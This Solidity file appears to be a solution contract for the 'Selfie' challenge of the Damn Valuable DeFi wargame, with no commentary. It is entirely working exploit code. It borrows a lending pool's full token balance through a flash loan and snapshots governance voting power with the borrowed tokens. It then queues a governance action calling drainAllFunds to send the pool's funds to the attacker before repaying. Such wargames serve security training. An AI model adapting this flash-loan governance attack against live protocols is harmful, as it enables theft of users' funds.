// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

interface IToken {
    function snapshot() external;
    function transfer(address to, uint256 amount) external;
    function balanceOf(address owner) external returns(uint256);
}

contract SelfieAttacker {

    address private attacker;
    IPool private immutable pool;
    IGovernance private immutable governance;
    IToken private immutable token;

    constructor(
        address _poolAddress,
        address _governanceAddress,
        address _tokenAddress
    ) {
        attacker = msg.sender;
        pool = IPool(_poolAddress);
        governance = IGovernance(_governanceAddress);
        token = IToken(_tokenAddress);
    }

    function attack() external {
        uint balance = token.balanceOf(address(pool));
        pool.flashLoan(balance);
    }

    function receiveTokens(address _tokenAddress, uint256 _amount) external {
        token.snapshot();
        governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
        token.transfer(address(pool), _amount);
    }
}
